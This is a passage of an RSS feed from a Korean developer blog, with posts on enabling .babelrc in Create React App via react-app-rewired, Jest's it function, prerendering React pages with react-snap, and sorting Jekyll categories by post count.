&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token property&quot;&gt;&quot;reactSnap&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  ...
  &lt;span class=&quot;token property&quot;&gt;&quot;puppeteerArgs&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;--no-sandbox&quot;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[React eject 없이 babelrc 적용]]></title><description><![CDATA[CRA으로 프로젝트를 생성한 뒤, .babelrc파일을 생성하여 설정하면 적용이 되지 않습니다. ./node_modules/react-scripts/config/webpack.config.js를 살펴보면 다음과 같이 설정되어있습니다. 1…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Thu, 28 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;CRA으로 프로젝트를 생성한 뒤, .babelrc파일을 생성하여 설정하면 적용이 되지 않습니다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;./node_modules/react-scripts/config/webpack.config.js&lt;/strong&gt;를 살펴보면 다음과 같이 설정되어있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;\.(js|mjs|jsx|ts|tsx)$&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; paths&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;appSrc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; require&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;babel-loader&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;customize&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; require&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
      &lt;span class=&quot;token string&quot;&gt;&apos;babel-preset-react-app/webpack-overrides&apos;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// @remove-on-eject-begin&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;babelrc&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;configFile&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;presets&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;require&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;babel-preset-react-app&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Make sure we have a unique cache identifier, erring on the&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// side of caution.&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// We remove this when the user ejects because the default&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// is sane and uses Babel options. Instead of options, we use&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// the react-scripts and babel-preset-react-app versions.&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;cacheIdentifier&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getCacheIdentifier&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
      isEnvProduction
        &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;production&apos;&lt;/span&gt;
        &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; isEnvDevelopment &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;development&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;babel-plugin-named-asset-import&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;babel-preset-react-app&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;react-dev-utils&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;react-scripts&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// @remove-on-eject-end&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        require&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;babel-plugin-named-asset-import&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token literal-property property&quot;&gt;loaderMap&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token literal-property property&quot;&gt;svg&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;token literal-property property&quot;&gt;ReactComponent&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;@svgr/webpack?-svgo![path]&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// This is a feature of `babel-loader` for webpack (not Babel itself).&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// It enables caching results in ./node_modules/.cache/babel-loader/&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// directory for faster rebuilds.&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;cacheDirectory&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;cacheCompression&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; isEnvProduction&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;compact&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; isEnvProduction&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;10번줄에 &lt;code class=&quot;language-text&quot;&gt;babelrc: false&lt;/code&gt;에 의해서 .babelrc를 만들어도 적용되지 않습니다.&lt;/p&gt;
&lt;p&gt;이를 해결하기 위해 &lt;a href=&quot;https://github.com/timarney/react-app-rewired&quot;&gt;react-app-rewired&lt;/a&gt;를 사용하겠습니다.&lt;/p&gt;
&lt;p&gt;해당 모듈을 사용하기 위해 &lt;code class=&quot;language-text&quot;&gt;pacakge.json&lt;/code&gt;의 스크립트중 &lt;code class=&quot;language-text&quot;&gt;start&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;test&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;build&lt;/code&gt;에 있는 &lt;code class=&quot;language-text&quot;&gt;react-scripts&lt;/code&gt;를 &lt;code class=&quot;language-text&quot;&gt;react-app-rewired&lt;/code&gt;로 변경해 줍니다.&lt;/p&gt;
&lt;p&gt;저의 경우는 다음과 같이 변경하였습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&quot;scripts&quot;: {
  &quot;start&quot;: &quot;react-app-rewired start&quot;,
  &quot;build&quot;: &quot;react-app-rewired build&quot;,
  &quot;test&quot;: &quot;react-app-rewired test&quot;,
  ...
},&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후 &lt;code class=&quot;language-text&quot;&gt;config-overrides.js&lt;/code&gt;에 설정을 재정의 해줍니다. 이 설정을 위해 &lt;a href=&quot;https://github.com/arackaf/customize-cra&quot;&gt;customize-cra&lt;/a&gt;모듈을 사용하면 편리합니다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;babelrc&lt;/strong&gt;(.babelrc, .babelrc.js)파일을 사용하기 위해서는 &lt;code class=&quot;language-text&quot;&gt;config-overrides.js&lt;/code&gt;에 다음과 같이 추가해주면 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; override&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; useBabelRc &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;customize-cra&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;useBabelRc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Jest it]]></title><description><![CDATA[React에서 Jest를 사용하여 유닛테스트를 진행할 때, it을 사용해서 테스트 구문을 만들 수 있습니다. it는 결국 test를 수행합니다. 와 같이 사용할 수 있습니다. Jest 공식문서]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 27 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;React에서 Jest를 사용하여 유닛테스트를 진행할 때, it을 사용해서 테스트 구문을 만들 수 있습니다.&lt;/p&gt;
&lt;p&gt;it는 결국 test를 수행합니다. &lt;code class=&quot;language-text&quot;&gt;it(name, fn, timeout)&lt;/code&gt;와 같이 사용할 수 있습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jestjs.io/docs/en/api.html#testname-fn-timeout&quot;&gt;Jest 공식문서&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[React snapshot]]></title><description><![CDATA[React를 사용해서 배포를 할 경우 SSR(Server Side Rendering)을 해줘야 검색엔진에서 제대로 수집 할 수 있습니다. 구글의 경우는 JS…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 26 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;React를 사용해서 배포를 할 경우 SSR(Server Side Rendering)을 해줘야 검색엔진에서 제대로 수집 할 수 있습니다.&lt;/p&gt;
&lt;p&gt;구글의 경우는 JS를 실행시키기 때문에 큰 문제가 발생하지 않지만, 특정 검색엔진은 초기 페이지만 가지고 수집을 하기 때문에 큰 문제가 발생할 수 있습니다.&lt;/p&gt;
&lt;p&gt;이를 해결하기 위해서 SSR을 추가로 구성하는데, 정적인 페이지의 경우는 SSR을 사용하고 미리 빌드를 하는 벙법이 있습니다.&lt;/p&gt;
&lt;p&gt;빌드를 하는 과정에서 특정 페이지별로 스냅샷을 찍어 미리 만들어 제공해주면 됩니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/stereobooster/react-snap&quot;&gt;react-snap&lt;/a&gt;을 사용하여 구성을 해보겠습니다.&lt;/p&gt;
&lt;p&gt;우선 설치를 해줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;yarn&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt; --dev react-snap&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후, &lt;code class=&quot;language-text&quot;&gt;package.json&lt;/code&gt;에 설정을 추가해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token property&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;postbuild&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;react-snap&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;마지막으로 &lt;code class=&quot;language-text&quot;&gt;src/index.js&lt;/code&gt;에서 다음 부분을 변경해 줍니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;ReactDOM&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;App &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 부분을 다음과 같이 변경합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; rootElement &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;rootElement&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;hasChildNodes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  ReactDOM&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;hydrate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;App &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; rootElement&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  ReactDOM&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;App &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; rootElement&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;기본적인 설정이 끝났으므로, 이제 빌드를 진행하게 되면 페이지가 생기게 됩니다.&lt;/p&gt;
&lt;p&gt;싱글 페이지의 경우 &lt;code class=&quot;language-text&quot;&gt;index.html&lt;/code&gt;과 &lt;code class=&quot;language-text&quot;&gt;200.html&lt;/code&gt;이 생기게 되고, 주소가 여러개일 경우 &lt;code class=&quot;language-text&quot;&gt;404.html&lt;/code&gt;이 추가됩니다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Router&lt;/strong&gt;를 사용하여 여러 페이지를 구현했어도, 주소를 입력해주지 않으면 자동으로 빌드를 하지 않기 때문에 &lt;code class=&quot;language-text&quot;&gt;package.json&lt;/code&gt;에 직접 추가해 줘야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token property&quot;&gt;&quot;reactSnap&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;include&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;/page1&quot;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 직접 URL을 입력해주어야 하기 때문에, 동적으로 변경되는 페이지에서는 SSR을 사용해야 합니다.&lt;/p&gt;
&lt;p&gt;하지만, 블로그와 같이 자주 변경되지 않고 직접 입력해줄 수 있으면 편하게 snapshot을 이용하여 해결할 수 있습니다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;react-snap&lt;/code&gt;의 더 자세한 설명은 &lt;a href=&quot;https://github.com/stereobooster/react-snap/blob/master/doc/behind-the-scenes.md&quot;&gt;다음&lt;/a&gt;을 참고해주세요.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Jekyll 카테고리 게시글 수 정렬]]></title><description><![CDATA[Github Page를 사용하여 블로그를 구축한 이유 중 하나가 구성을 원하는데로 할 수 있는 장점이 있기 때문이였다. leonids theme…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 22 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Github Page를 사용하여 블로그를 구축한 이유 중 하나가 구성을 원하는데로 할 수 있는 장점이 있기 때문이였다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/renyuanz/leonids/&quot;&gt;leonids theme&lt;/a&gt;를 사용하여 블로그를 구축 하였는데, 카테고리 정렬 순서가 어떻게 되어있는지 잘 모르겠다.&lt;/p&gt;
&lt;p&gt;그래서 원하는 구성인 이름을 할지, 게시글 수로 할지 고민을 하다가 최종적으로 게시글 수로 정렬을 하게 되었다.&lt;/p&gt;
&lt;p&gt;가장 처음에는 &lt;code class=&quot;language-text&quot;&gt;site.categories&lt;/code&gt;에 있는 값을 정렬하려고 했지만, 실패했다.&lt;/p&gt;
&lt;p&gt;그래서 해당 값에서 게시글이 몇개인지를 추출하여 사용하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;liquid&quot;&gt;&lt;pre class=&quot;language-liquid&quot;&gt;&lt;code class=&quot;language-liquid&quot;&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; s &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 작성하면 &lt;code class=&quot;language-text&quot;&gt;size&lt;/code&gt;에 게시글 수가 저장된다. 하지만 정렬을 하는 기준은 문자열이기 때문에, &lt;strong&gt;0&lt;/strong&gt; 패딩을 추가해 주어야 한다.&lt;/p&gt;
